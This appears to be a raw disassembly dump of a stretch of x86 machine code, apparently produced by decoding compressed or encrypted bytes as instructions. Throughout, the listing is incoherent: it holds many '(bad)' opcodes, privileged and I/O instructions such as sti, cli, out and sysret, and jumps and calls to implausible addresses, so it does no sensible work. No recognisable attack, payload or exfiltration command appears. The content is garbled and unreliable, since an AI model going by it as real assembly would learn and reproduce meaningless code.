  41f5fc:	jns    0x41f5f7
  41f5fe:	sbb    BYTE PTR [edi-0x42],0xf8
  41f602:	(bad)  
  41f603:	por    mm5,QWORD PTR [esi]
  41f606:	and    DWORD PTR [ebx],0xffffffc0
  41f609:	jno    0x41f5cd
  41f60b:	lea    esi,[ecx]
  41f60d:	cmp    dl,al
  41f60f:	fistp  DWORD PTR [ebx-0x5c]
  41f612:	sbb    eax,0x75a8b226
  41f617:	jl     0x41f687
  41f619:	fld    DWORD PTR [ecx-0x35c754a8]
  41f61f:	dec    DWORD PTR [ecx]
  41f621:	push   ebx
  41f622:	ins    DWORD PTR es:[edi],dx
  41f623:	fucomp st(6)
  41f625:	sti    
  41f626:	jg     0x41f657
  41f628:	(bad)  
  41f629:	aaa    
  41f62a:	sub    DWORD PTR [ebx-0x4acf3875],edx
  41f630:	mov    dh,0x74
  41f632:	add    BYTE PTR [edx-0x3d122b91],bh
  41f638:	shr    DWORD PTR [esi-0x65a2d742],cl
  41f63e:	shr    dl,0xc3
  41f641:	mov    fs,WORD PTR [esi+0x944680c]
  41f647:	fucomi st,st(2)
  41f649:	xor    al,0x62
  41f64b:	fdivr  DWORD PTR [esi-0x7c]
  41f64e:	fs jg  0x41f6af
  41f651:	push   0x6027140d
  41f656:	ret    0x2da9
  41f659:	pop    eax
  41f65a:	cmc    
  41f65b:	sbb    BYTE PTR [eax+0x3f],0xf
  41f65f:	cmp    eax,0x27787f01
  41f664:	inc    ecx
  41f665:	sti    
  41f666:	outs   dx,DWORD PTR ds:[esi]
  41f667:	inc    BYTE PTR [esi]
  41f669:	shl    BYTE PTR cs:[ecx+0x71],1
  41f66d:	xor    DWORD PTR [edx],ebp
  41f66f:	je     0x41f699
  41f671:	dec    edx
  41f672:	xacquire xchg DWORD PTR [esi+0x3bdca49c],ebp
  41f679:	fucomi st,st(4)
  41f67b:	ds into 
  41f67d:	sub    DWORD PTR [eax+0x7339c51e],0xd
  41f684:	mov    cs,WORD PTR [ebx+0x3885ecba]
  41f68a:	adc    ebp,DWORD PTR [edx]
  41f68c:	xor    eax,0x2872f15b
  41f691:	test   al,0x4b
  41f693:	sub    ebp,DWORD PTR [eax-0x36]
  41f696:	push   cs
  41f697:	jae    0x41f67d
  41f699:	and    al,0xac
  41f69b:	and    DWORD PTR [ecx+0xa0f0c12],eax
  41f6a1:	and    eax,0x7030521f
  41f6a6:	adc    BYTE PTR [edi],bh
  41f6a8:	loope  0x41f654
  41f6aa:	adc    DWORD PTR [edi-0x4a],0xffffffe4
  41f6ae:	shl    edx,1
  41f6b0:	or     ebx,DWORD PTR [ecx-0x6c0aa6a0]
  41f6b6:	push   edx
  41f6b7:	stc    
  41f6b8:	outs   dx,DWORD PTR ds:[esi]
  41f6b9:	mov    esp,0xbcff4b77
  41f6be:	inc    eax
  41f6bf:	dec    eax
  41f6c0:	retf   0x3462
  41f6c3:	xchg   esp,eax
  41f6c4:	xchg   DWORD PTR [ebp-0x5e45b7d],esi
  41f6ca:	rcl    al,0x39
  41f6cd:	cmp    cl,BYTE PTR ds:0xcd428897
  41f6d3:	pop    edi
  41f6d4:	loop   0x41f728
  41f6d6:	frstor [esi+ecx*2-0x5a4aaf2b]
  41f6dd:	(bad)  
  41f6de:	jmp    0x41f6e1
  41f6e0:	enter  0x27de,0x87
  41f6e4:	call   0xf9a28768
  41f6e9:	jle    0x41f67a
  41f6eb:	je     0x41f6b1
  41f6ed:	dec    ebx
  41f6ee:	push   cs
  41f6ef:	pop    ss
  41f6f0:	mov    DWORD PTR [esi-0x4ed67030],ecx
  41f6f6:	pop    ecx
  41f6f7:	and    ah,BYTE PTR [ebp+0xdef86e2]
  41f6fd:	shr    BYTE PTR [ebx],1
  41f6ff:	gs dec edi
  41f701:	(bad)  
  41f703:	arpl   WORD PTR [edi+0x16480b6d],si
  41f709:	jb     0x41f71e
  41f70b:	cdq    
  41f70c:	fsub   DWORD PTR [ecx+esi*4]
  41f70f:	(bad)  
  41f710:	jl     0x41f73c
  41f712:	fcom   DWORD PTR [ecx-0x58]
  41f715:	mov    WORD PTR [edx-0x271b9e2d],gs
  41f71b:	inc    eax
  41f71c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f71d:	pop    ecx
  41f71e:	mov    dl,0xca
  41f720:	sub    eax,0x96282d4d
  41f725:	dec    esi
  41f726:	push   esp
  41f727:	scas   eax,DWORD PTR es:[edi]
  41f728:	aam    0x81
  41f72a:	into   
  41f72b:	retf   0x5ac0
  41f72e:	push   esi
  41f72f:	ja     0x41f7ab
  41f731:	enter  0xd308,0x72
  41f735:	mov    ebp,?
  41f737:	out    0x77,eax
  41f739:	inc    ecx
  41f73a:	fcomip st,st(5)
  41f73c:	mov    al,BYTE PTR [eax-0x7549ac4a]
  41f742:	or     DWORD PTR [ebp-0x30],ecx
  41f745:	or     ebx,0xb
  41f748:	adc    al,0x4d
  41f74a:	push   ds
  41f74b:	cmp    bl,al
  41f74d:	pop    ebx
  41f74e:	repnz pop esi
  41f750:	sub    BYTE PTR [edi-0x110c8bc8],bh
  41f756:	xchg   esp,eax
  41f757:	cld    
  41f758:	sti    
  41f759:	push   esp
  41f75a:	das    
  41f75b:	call   0x8d670847
  41f760:	(bad)  
  41f761:	jmp    0x41f791
  41f763:	or     ebx,DWORD PTR [esi]
  41f765:	out    0xc4,eax
  41f767:	mov    bh,0x11
  41f769:	daa    
  41f76a:	pop    ebx
  41f76b:	push   ebp
  41f76c:	jb     0x41f7d9
  41f76e:	xor    al,0x2d
  41f770:	(bad)  
  41f771:	mov    WORD PTR [eax+ecx*4],?
  41f774:	jnp    0x41f7bc
  41f776:	fsubr  st(3),st
  41f778:	xchg   edx,eax
  41f779:	sahf   
  41f77a:	aad    0x21
  41f77c:	dec    edx
  41f77d:	mov    eax,ds:0x2a49c2bd
  41f782:	out    dx,eax
  41f783:	cdq    
  41f784:	(bad)  
  41f785:	sbb    BYTE PTR [ecx-0x32731927],ch
  41f78b:	jl     0x41f715
  41f78d:	scas   al,BYTE PTR es:[edi]
  41f78e:	sbb    cl,BYTE PTR [ecx-0x7d]
  41f791:	pop    eax
  41f792:	add    eax,0xefcb24e8
  41f797:	adc    edx,DWORD PTR [ecx+0x5d]
  41f79a:	add    dh,BYTE PTR [edi-0xe]
  41f79d:	ins    BYTE PTR es:[edi],dx
  41f79e:	les    esp,FWORD PTR [eax+0x3244aef8]
  41f7a4:	jg     0x41f7cd
  41f7a6:	sbb    eax,DWORD PTR [esi+0x477927ca]
  41f7ac:	add    al,0x88
  41f7ae:	push   eax
  41f7af:	(bad)  
  41f7b0:	mov    ch,0xc8
  41f7b2:	mov    ebp,0xa4ee2705
  41f7b7:	mov    al,ds:0x7cc82816
  41f7bc:	sbb    al,0x87
  41f7be:	in     eax,0x7d
  41f7c0:	xchg   BYTE PTR [ebx+esi*4],bl
  41f7c3:	dec    ebp
  41f7c4:	adc    esi,edx
  41f7c6:	outs   dx,DWORD PTR ds:[esi]
  41f7c7:	pop    ecx
  41f7c8:	rcr    DWORD PTR [ecx],0xa0
  41f7cb:	pop    ebx
  41f7cc:	adc    eax,0x1d878825
  41f7d1:	mov    esi,0x22ce691a
  41f7d6:	mov    ch,0x35
  41f7d8:	or     dh,BYTE PTR [edx-0x71]
  41f7db:	mov    bh,0x18
  41f7dd:	out    dx,eax
  41f7de:	(bad)  
  41f7df:	sbb    al,0xd2
  41f7e1:	push   esp
  41f7e2:	fs dec edi
  41f7e4:	push   edi
  41f7e5:	call   0xfc3ba12c
  41f7ea:	pusha  
  41f7eb:	clc    
  41f7ec:	push   ebx
  41f7ed:	xchg   esi,eax
  41f7ee:	dec    edi
  41f7ef:	out    dx,eax
  41f7f0:	push   ecx
  41f7f1:	dec    ecx
  41f7f2:	lock push edx
  41f7f4:	mov    WORD PTR [edx+0xe],ds
  41f7f7:	xor    BYTE PTR [bp+si+0x1b],ch
  41f7fb:	push   esi
  41f7fc:	mov    ah,0xd0
  41f7fe:	and    BYTE PTR [ebp+0x39a52b71],dl
  41f804:	lea    ebx,[eax+0x4b2bd101]
  41f80a:	or     BYTE PTR [ecx-0x6f],ch
  41f80d:	and    eax,0x92c7b079
  41f812:	test   BYTE PTR [eax],al
  41f814:	into   
  41f815:	adc    ebx,edx
  41f817:	cld    
  41f818:	pop    ebp
  41f819:	fld    DWORD PTR [edi-0x6c]
  41f81c:	or     bh,BYTE PTR [ecx+0x36bb7a21]
  41f822:	shl    DWORD PTR [edx],0x44
  41f825:	mov    WORD PTR [eax],fs
  41f827:	outs   dx,BYTE PTR ds:[esi]
  41f828:	jmp    0x41f86a
  41f82a:	or     eax,0x8eed91e4
  41f82f:	(bad)  
  41f830:	ret    0x8758
  41f833:	xlat   BYTE PTR ds:[ebx]
  41f834:	jno    0x41f7cb
  41f836:	mov    eax,ds:0xf74c64bd
  41f83b:	lods   al,BYTE PTR ds:[esi]
  41f83c:	in     eax,dx
  41f83d:	adc    al,0x1a
  41f83f:	div    DWORD PTR [edi-0x47]
  41f842:	mov    esp,0x3f5c4b4d
  41f847:	inc    edx
  41f848:	shl    DWORD PTR [edx-0x2f],cl
  41f84b:	mov    cl,BYTE PTR [edi-0x68]
  41f84e:	shl    DWORD PTR [ebp-0x1c913762],0xc4
  41f855:	(bad)  
  41f856:	scas   al,BYTE PTR es:[edi]
  41f857:	int3   
  41f858:	stos   DWORD PTR es:[edi],eax
  41f859:	ja     0x41f7e8
  41f85b:	and    ah,bl
  41f85d:	sub    ebx,edi
  41f85f:	stos   DWORD PTR es:[edi],eax
  41f860:	ss test al,0x95
  41f863:	(bad)  
  41f864:	(bad)  
  41f866:	ret    
  41f867:	outs   dx,DWORD PTR ds:[esi]
  41f868:	sub    dh,BYTE PTR [edx+0x74]
  41f86b:	ret    0x3390
  41f86e:	outs   dx,BYTE PTR ds:[esi]
  41f86f:	push   edx
  41f870:	stos   BYTE PTR es:[edi],al
  41f871:	and    DWORD PTR [edi],esp
  41f873:	mov    esp,0x7a4f070a
  41f878:	pop    edx
  41f879:	das    
  41f87a:	loop   0x41f88f
  41f87c:	mov    esp,0xdbe88b00
  41f881:	pop    edx
  41f882:	retf   0x3d4
  41f885:	mov    ebx,0x7f68a88
  41f88a:	sub    al,0xa4
  41f88c:	aaa    
  41f88d:	(bad)  
  41f88e:	pop    ecx
  41f88f:	mov    ch,0x6b
  41f891:	arpl   WORD PTR [eax-0x50955150],cx
  41f897:	daa    
  41f898:	stc    
  41f899:	xchg   ebp,edx
  41f89b:	mov    eax,0xfcdfc525
  41f8a0:	lahf   
  41f8a1:	adc    eax,0xa5c707cb
  41f8a6:	xchg   ecx,eax
  41f8a7:	adc    ah,BYTE PTR [edi]
  41f8a9:	and    eax,0x37363227
  41f8ae:	std    
  41f8af:	sbb    ch,bh
  41f8b1:	pop    ds
  41f8b2:	mov    esp,0xb130629c
  41f8b7:	adc    BYTE PTR [edx+0x6d],dl
  41f8ba:	jg     0x41f8fd
  41f8bc:	stos   BYTE PTR es:[edi],al
  41f8bd:	mov    ecx,0xbf5441d5
  41f8c2:	mov    al,0x2b
  41f8c4:	xchg   BYTE PTR [eax],cl
  41f8c6:	jl     0x41f92e
  41f8c8:	jmp    0x41f8a3
  41f8ca:	bound  edx,QWORD PTR [ebp+0x73]
  41f8cd:	pushf  
  41f8ce:	xor    BYTE PTR [ecx],bl
  41f8d0:	inc    ebx
  41f8d1:	cmp    BYTE PTR [eax+0x633cd2fb],bl
  41f8d7:	cmp    BYTE PTR [ecx*1+0x45970393],bh
  41f8de:	and    al,BYTE PTR [edi]
  41f8e0:	div    BYTE PTR [ebx]
  41f8e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8e3:	mov    ds:0xb5d1a4ff,al
  41f8e8:	ins    BYTE PTR es:[edi],dx
  41f8e9:	jnp    0x41f8ad
  41f8eb:	jne    0x41f873
  41f8ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8ee:	inc    ebp
  41f8ef:	mov    dl,BYTE PTR ds:0x2567ab29
  41f8f5:	mov    eax,0xd5fbf20d
  41f8fa:	shr    eax,cl
  41f8fc:	mov    ah,0x62
  41f8fe:	fistp  DWORD PTR [ebp-0xc]
  41f901:	pop    eax
  41f902:	xor    eax,0x867c7e9
  41f907:	iret   
  41f908:	push   eax
  41f909:	mov    esi,0x48ee29ed
  41f90e:	daa    
  41f90f:	cld    
  41f910:	pop    edi
  41f911:	xor    edx,DWORD PTR [ebp-0x18]
  41f914:	jo     0x41f8e2
  41f916:	push   edi
  41f917:	(bad)
  41f91a:	sub    dl,dl
  41f91c:	cmp    eax,0x13781835
  41f922:	mov    ah,0xfb
  41f924:	call   0x68eda790
  41f929:	lods   al,BYTE PTR ds:[esi]
  41f92a:	xor    al,0xd6
  41f92c:	adc    eax,0xa4616e8c
  41f931:	push   0xbcbcda2d
  41f936:	cmp    ah,al
  41f938:	call   edx
  41f93a:	push   ss
  41f93b:	outs   dx,BYTE PTR ds:[esi]
  41f93c:	shr    DWORD PTR [ebx+ebp*4],0xc0
  41f940:	push   ss
  41f941:	pop    edx
  41f942:	arpl   WORD PTR [edx+edx*8+0x61],sp
  41f946:	shl    DWORD PTR [ecx-0x11],0xdb
  41f94a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f94b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f94c:	add    eax,0xa9b06cb3
  41f951:	sub    al,0x11
  41f953:	fisub  WORD PTR gs:[ecx-0x6b3575e3]
  41f95a:	cmp    BYTE PTR [edi],bl
  41f95c:	push   ecx
  41f95d:	push   edx
  41f95e:	fs fsubrp st(7),st
  41f961:	rcl    BYTE PTR [ecx+0x6be80f2b],cl
  41f967:	cwde   
  41f968:	(bad)  
  41f969:	js     0x41f9ac
  41f96b:	sysret 
  41f96d:	jae    0x41f995
  41f96f:	xchg   esi,eax
  41f970:	inc    edx
  41f971:	mov    cl,0x70
  41f973:	mov    dh,0x7a
  41f975:	aam    0x72
  41f977:	mov    cl,0xc7
  41f979:	inc    edi
  41f97a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f97b:	pushf  
  41f97c:	(bad)  
  41f97d:	test   al,0xcd
  41f97f:	sahf   
  41f980:	nop
  41f981:	sahf   
  41f982:	mov    bh,0xe5
  41f984:	jge    0x41f991
  41f986:	sub    ch,bh
  41f988:	in     eax,dx
  41f989:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f98a:	pop    ebp
  41f98b:	xor    esi,DWORD PTR [ebp-0x346ab9a4]
  41f991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f992:	pop    esp
  41f993:	mov    cl,BYTE PTR [ebx-0x1c]
  41f996:	mov    ds:0x1ab94d1d,eax
  41f99b:	int    0x24
  41f99d:	mov    BYTE PTR [esi+0x60],al
  41f9a0:	enter  0x9bd5,0x84
  41f9a4:	ins    DWORD PTR es:[edi],dx
  41f9a5:	push   ebx
  41f9a6:	loop   0x41f974
  41f9a8:	pop    eax
  41f9a9:	stos   DWORD PTR es:[edi],eax
  41f9aa:	daa    
  41f9ab:	and    DWORD PTR [ebx-0x2d],eax
  41f9ae:	jmp    0xdc91bb34
  41f9b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9b4:	mov    ebp,0x96396e36
  41f9b9:	xchg   ecx,eax
  41f9ba:	xor    eax,0x435a9385
  41f9bf:	call   DWORD PTR ds:0x93c269c6
  41f9c5:	mov    edi,0xa91e9e40
  41f9ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9cb:	jo     0x41f9dc
  41f9cd:	or     DWORD PTR [eax-0x7de42f8d],esi
  41f9d3:	not    BYTE PTR [ebx-0x7b]
  41f9d6:	jecxz  0x41f9f6
  41f9d8:	cld    
  41f9d9:	dec    edx
  41f9da:	mov    edx,0x3c7faa44
  41f9df:	sbb    DWORD PTR [esp+ebp*4+0x54],ecx
  41f9e3:	xchg   esp,eax
  41f9e4:	push   esi
  41f9e5:	stc    
  41f9e6:	or     bh,0x25
  41f9e9:	pop    esp
  41f9ea:	adc    DWORD PTR [edi-0x3d],0xadfb1b64
  41f9f1:	cdq    
  41f9f2:	push   ss
  41f9f3:	and    BYTE PTR [edi],ah
  41f9f5:	cli    
  41f9f6:	jmp    0xafe9c57a
  41f9fb:	leave  
  41f9fc:	xor    al,0x4
  41f9fe:	push   eax
  41f9ff:	dec    edi
  41fa00:	add    eax,0x1c04e6c8
  41fa05:	(bad)  
  41fa06:	mov    ebp,eax
  41fa08:	aas    
  41fa09:	iret   
  41fa0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa0b:	push   cs
  41fa0c:	mov    cs,WORD PTR [edx]
  41fa0e:	cld    
  41fa0f:	into   
  41fa10:	xchg   edx,eax
  41fa11:	mov    edi,ecx
  41fa13:	cmp    DWORD PTR [ecx-0x3d],0x45715f11
  41fa1a:	push   ebx
  41fa1b:	loope  0x41fa62
  41fa1d:	fwait
  41fa1e:	xchg   esi,eax
  41fa1f:	dec    ecx
  41fa20:	adc    al,0x12
  41fa22:	push   ebp
  41fa23:	out    dx,al
  41fa24:	rol    DWORD PTR [esi-0x6fc0236f],0xd4
  41fa2b:	mov    edx,0x24bd7a76
  41fa30:	out    dx,eax
  41fa31:	int3   
  41fa32:	push   cs
  41fa33:	add    al,0x8d
  41fa35:	push   ebx
  41fa36:	fisttp QWORD PTR [edx]
  41fa38:	adc    al,0x15
  41fa3a:	loope  0x41f9f4
  41fa3c:	adc    DWORD PTR [ebx],esp
  41fa3e:	mov    eax,ds:0xe9eac390
  41fa43:	sahf   
  41fa44:	push   ecx
  41fa45:	dec    edi
  41fa46:	and    bh,bl
  41fa48:	pop    ds
  41fa49:	ds xchg edi,eax
  41fa4b:	xchg   dl,dh
  41fa4d:	dec    edx
  41fa4e:	and    ah,BYTE PTR [edi]
  41fa50:	jns    0x41fa4e
  41fa52:	dec    ebp
  41fa53:	or     DWORD PTR [esi],ecx
  41fa55:	ds xchg ecx,eax
  41fa57:	jmp    0x41faa9
  41fa59:	mov    eax,0x69d09365
  41fa5e:	leave  
  41fa5f:	push   ds
  41fa60:	bound  ebp,QWORD PTR [edi-0x7e]
  41fa63:	pop    ecx
  41fa64:	dec    esp
  41fa65:	xchg   esi,eax
  41fa66:	cmp    BYTE PTR ds:0xcc35c9fb,dl
  41fa6c:	bnd ss ret 
  41fa6f:	xchg   esi,eax
  41fa70:	xchg   ebp,eax
  41fa71:	pop    ds
  41fa72:	jns    0x41fa3b
  41fa74:	inc    eax
  41fa75:	sbb    al,0x66
  41fa77:	xchg   edi,eax
  41fa78:	(bad)  
  41fa79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa7a:	mov    ds:0x5f4fdd0,eax
  41fa7f:	div    BYTE PTR [ebx]
  41fa81:	sti    
  41fa82:	mov    eax,ds:0xe6bc1c7c
  41fa87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa88:	fidiv  WORD PTR [ecx-0x56d71d6]
  41fa8e:	scas   eax,DWORD PTR es:[edi]
  41fa8f:	icebp  
  41fa90:	dec    ebx
  41fa91:	ss pop ebx
  41fa93:	mov    bh,0x43
  41fa95:	push   ebx
  41fa96:	fwait
  41fa97:	xchg   esi,eax
  41fa98:	sub    eax,DWORD PTR [ebp-0x4b]
  41fa9b:	inc    eax
  41fa9c:	mov    ah,0x6
  41fa9e:	cwde   
  41fa9f:	jl     0x41faee
  41faa1:	and    eax,0x5350b50a
  41faa6:	inc    esp
  41faa7:	stos   BYTE PTR es:[edi],al
  41faa8:	loope  0x41facd
  41faaa:	sahf   
  41faab:	out    0x5,eax
  41faad:	sbb    al,0xd9
  41faaf:	scas   al,BYTE PTR es:[edi]
  41fab0:	adc    DWORD PTR [ebx+0x4c],ebp
  41fab3:	sub    ebp,eax
  41fab5:	js     0x41fa75
  41fab7:	jns    0x41fa8b
  41fab9:	mov    ah,0x48
  41fabb:	and    eax,0x99f6f127
  41fac0:	inc    edx
  41fac1:	mov    ah,0xad
  41fac3:	sbb    DWORD PTR [edi],esp
  41fac5:	sbb    al,0x53
  41fac7:	das    
  41fac8:	rol    BYTE PTR [edi+eax*2],1
  41facb:	or     BYTE PTR [ecx-0x5f],cl
  41face:	ss pusha 
  41fad0:	out    dx,eax
  41fad1:	xchg   DWORD PTR [ebp-0x67],ebx
  41fad4:	in     al,dx
  41fad5:	sub    ch,BYTE PTR [eax]
  41fad7:	xchg   edi,eax
  41fad8:	adc    dh,BYTE PTR [esi-0x16266b27]
  41fade:	xchg   edx,eax
  41fadf:	(bad)  
  41fae0:	sbb    al,0x99
  41fae2:	jle    0x41fb1c
  41fae4:	ficomp DWORD PTR [ebx]
  41fae6:	mov    ecx,esi
  41fae8:	fidivr DWORD PTR [edi]
  41faea:	dec    esp
  41faeb:	cmc    
  41faec:	dec    edi
  41faed:	repz dec eax
  41faef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faf0:	push   esi
  41faf1:	sub    edi,eax
  41faf3:	cmp    BYTE PTR [ecx-0x5694d73b],ah
  41faf9:	stos   DWORD PTR es:[edi],eax
  41fafa:	xor    ecx,DWORD PTR [ebx]
  41fafc:	cmc    
  41fafd:	in     al,dx
  41fafe:	xchg   edx,eax
  41faff:	(bad)  
  41fb00:	mul    ch
  41fb02:	ds push ds
  41fb04:	jb     0x41fab7
  41fb06:	(bad)  
  41fb07:	ins    BYTE PTR es:[edi],dx
  41fb08:	jb     0x41fb0a
  41fb0a:	test   BYTE PTR [edi-0x82c89db],bh
  41fb10:	jp     0x41facf
  41fb12:	push   esi
  41fb13:	pop    ecx
  41fb14:	and    ebx,DWORD PTR [esi-0x7b386dee]
  41fb1a:	ins    BYTE PTR es:[edi],dx
  41fb1b:	pop    esi
  41fb1c:	jmp    0x77bd:0x70df6fc8
  41fb23:	inc    ecx
  41fb24:	retf   0xe247
  41fb27:	mov    ebp,0x4f7b6520
  41fb2c:	fidiv  WORD PTR [ecx+0x194658b2]
  41fb32:	jg     0x41fb8a
  41fb34:	imul   eax,DWORD PTR [edi],0x21
  41fb37:	push   ds
  41fb38:	adc    DWORD PTR [ebp+0x41e3b5a2],esp
  41fb3e:	sub    edx,DWORD PTR [edi-0x37]
  41fb41:	and    al,BYTE PTR [esi-0x4cf6de50]
  41fb47:	mov    bh,0x48
  41fb49:	cmp    DWORD PTR [edx-0x1d],0x6b
  41fb4d:	sbb    al,0x11
  41fb4f:	ficomp DWORD PTR ds:0x31e9d705
  41fb55:	jecxz  0x41fb7e
  41fb57:	and    BYTE PTR gs:[ebx],bl
  41fb5a:	das    
  41fb5b:	dec    ecx
  41fb5c:	sti    
  41fb5d:	fsub   QWORD PTR [ebx]
  41fb5f:	xchg   edx,eax
  41fb60:	push   ecx
  41fb61:	mov    ecx,0x5f7eb4bc
  41fb66:	je     0x41fb4a
  41fb68:	push   ebp
  41fb69:	pop    esp
  41fb6a:	adc    edi,DWORD PTR [esi+0x49]
  41fb6d:	xchg   edx,eax
  41fb6e:	and    DWORD PTR [ecx+edx*2+0x6],edi
  41fb72:	ins    DWORD PTR es:[edi],dx
  41fb73:	into   
  41fb74:	mov    esp,ebx
  41fb76:	enter  0x377a,0x15
  41fb7a:	mov    ?,WORD PTR [ecx+0x4486787f]
  41fb80:	push   edx
  41fb81:	aas    
  41fb82:	mov    ah,0xec
  41fb84:	and    dl,cl
  41fb86:	mov    ecx,ecx
  41fb88:	or     al,0x58
  41fb8a:	rol    BYTE PTR ds:0xcddfefab,0xbc
  41fb91:	pminsw mm0,mm3
  41fb94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb95:	gs mov al,0xd6
  41fb98:	xchg   edx,eax
  41fb99:	fidivr DWORD PTR [ecx]
  41fb9b:	push   ebx
  41fb9c:	push   es
  41fb9d:	add    ah,ah
  41fb9f:	cmovg  edx,ebp
  41fba2:	mov    al,ds:0x94d28385
  41fba7:	mov    ch,0x73
  41fba9:	test   al,0x68
  41fbab:	mov    al,ds:0xdea93a54
  41fbb0:	cmc    
  41fbb1:	(bad)  
  41fbb2:	lahf   
  41fbb3:	add    al,0x11
  41fbb5:	lods   al,BYTE PTR ds:[esi]
  41fbb6:	stos   DWORD PTR es:[edi],eax
  41fbb7:	xor    BYTE PTR [eax+0x717a6fa9],bl
  41fbbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbbe:	jle    0x41fb54
  41fbc0:	(bad)  
  41fbc2:	cmp    DWORD PTR [eax],ecx
  41fbc4:	push   ecx
  41fbc5:	rcl    DWORD PTR [ecx+esi*1-0x6c],0xe9
  41fbca:	aas    
  41fbcb:	les    ebp,FWORD PTR [edi]
  41fbcd:	ret    0x4bad
  41fbd0:	push   ds
  41fbd1:	lock loop 0x41fbb6
  41fbd4:	sub    BYTE PTR [ebp-0x7],bh
  41fbd7:	rcr    BYTE PTR [esi],1
  41fbd9:	inc    esi
  41fbda:	in     al,0x91
  41fbdc:	pop    edi
  41fbdd:	rol    ebx,cl
  41fbdf:	mov    eax,0xe75b368a
  41fbe4:	mov    cl,0xd4
  41fbe6:	into   
  41fbe7:	mov    cl,0x53
  41fbe9:	sub    dh,BYTE PTR [edi]
  41fbeb:	pop    es
  41fbec:	lock and ebx,DWORD PTR [ebx+0x7b]
  41fbf0:	int3   
  41fbf1:	or     esi,DWORD PTR [esi-0x54]
  41fbf4:	or     eax,0x50de5a55
  41fbf9:	pop    ebp
  41fbfa:	loopne 0x41fbe2
  41fbfc:	in     eax,0x65
  41fbfe:	and    DWORD PTR [ebp-0x78],0xe3e14ab1
  41fc05:	inc    esi
  41fc06:	and    ebp,esi
  41fc08:	aad    0xdc
  41fc0a:	and    BYTE PTR [esi+edx*2],0x74
  41fc0e:	ins    DWORD PTR es:[edi],dx
  41fc0f:	push   0xffffffbe
  41fc11:	cmp    BYTE PTR [ebp+0x1b],bh
  41fc14:	(bad)  
  41fc15:	int    0x3c
  41fc17:	cli    
  41fc18:	gs pop ebp
  41fc1a:	and    eax,0x2258637b
  41fc1f:	(bad)  
  41fc21:	inc    edx
  41fc22:	push   cs
  41fc23:	dec    esi
  41fc24:	push   cs
  41fc25:	push   esi
  41fc26:	mov    esi,0x410909d
  41fc2b:	cmp    edx,DWORD PTR [edx]
  41fc2d:	mov    ah,0x8b
  41fc2f:	xchg   ebx,eax
  41fc30:	arpl   WORD PTR [esi-0x2f8890cd],bx
  41fc36:	push   ds
  41fc37:	aaa    
  41fc38:	hlt    
  41fc39:	sbb    DWORD PTR [esi-0x6a],ebx
  41fc3c:	dec    esi
  41fc3d:	dec    ebp
  41fc3e:	in     eax,0x5
  41fc40:	packsswb mm7,QWORD PTR [esi]
  41fc43:	sub    al,0xe
  41fc45:	adc    ch,BYTE PTR [ebx+0x27]
  41fc48:	stc    
  41fc49:	pop    ecx
  41fc4a:	imul   ebx,DWORD PTR [ebp+0x11],0x1b
  41fc4e:	dec    ebp
  41fc4f:	jmp    0xb1bc:0x7f19f9e5
  41fc56:	push   0x4f11f6f4
  41fc5b:	xchg   edi,eax
  41fc5c:	jmp    0xbdba:0x4739a4ed
  41fc63:	jno    0x41fc2d
  41fc65:	mov    edx,0xb024f389
  41fc6a:	mov    ?,WORD PTR [ebx-0x660ecddc]
  41fc70:	pop    es
  41fc71:	loope  0x41fc0c
  41fc73:	ja     0x41fc40
  41fc75:	lock or bh,BYTE PTR [ebp+0x45]
  41fc79:	int    0x18
  41fc7b:	enter  0x4eb1,0x88
  41fc7f:	add    al,0xfb
  41fc81:	cmp    al,0x1a
  41fc83:	aaa    
  41fc84:	scas   al,BYTE PTR es:[edi]
  41fc85:	aas    
  41fc86:	stos   BYTE PTR es:[edi],al
  41fc87:	fs and esp,eax
  41fc8a:	xchg   ebp,eax
  41fc8b:	jno    0x41fc16
  41fc8d:	jmp    0x41fcba
  41fc8f:	sahf   
  41fc90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc91:	pop    eax
  41fc92:	inc    ecx
  41fc93:	retf   
  41fc94:	dec    ecx
  41fc95:	es add ah,ch
  41fc98:	dec    ebx
  41fc99:	mov    BYTE PTR [ebp+0x5dec84bc],0x16
  41fca0:	mov    ds:0x53b669a9,eax
  41fca5:	or     al,0x9b
  41fca7:	or     al,0x23
  41fca9:	push   ss
  41fcaa:	jmp    0x712e7360
  41fcaf:	scas   al,BYTE PTR es:[edi]
  41fcb0:	dec    esp
  41fcb1:	cmp    eax,0x854d08d
  41fcb6:	ret    0xe0af
  41fcb9:	jmp    0x4d86ee1a
  41fcbe:	sahf   
  41fcbf:	dec    edi
  41fcc0:	test   BYTE PTR [ebx+0x14a2922a],al
  41fcc6:	je     0x41fcc4
  41fcc8:	sbb    ah,bh
  41fcca:	clc    
  41fccb:	fs fs ins DWORD PTR es:[edi],dx
  41fcce:	dec    esp
  41fccf:	jmp    0x41fd21
  41fcd1:	xor    ah,BYTE PTR [ebp+edx*1+0x9]
  41fcd5:	lods   eax,DWORD PTR ds:[esi]
  41fcd6:	cmp    eax,0x775b9eb2
  41fcdb:	mov    di,0xa78f
  41fcdf:	fstp   DWORD PTR [ecx+0x1e]
  41fce2:	mov    eax,0xf722a90f
  41fce7:	(bad)
  41fcea:	cdq    
  41fceb:	push   ebp
  41fcec:	jp     0x41fd4f
  41fcee:	mov    ds:0xbc347f5d,eax
  41fcf3:	inc    ebx
  41fcf4:	dec    edx
  41fcf5:	xor    dl,bl
  41fcf7:	add    esi,ebx
  41fcf9:	add    DWORD PTR [edi],ebp
  41fcfb:	lahf   
  41fcfc:	or     eax,0xdd465b16
  41fd01:	mov    bl,al
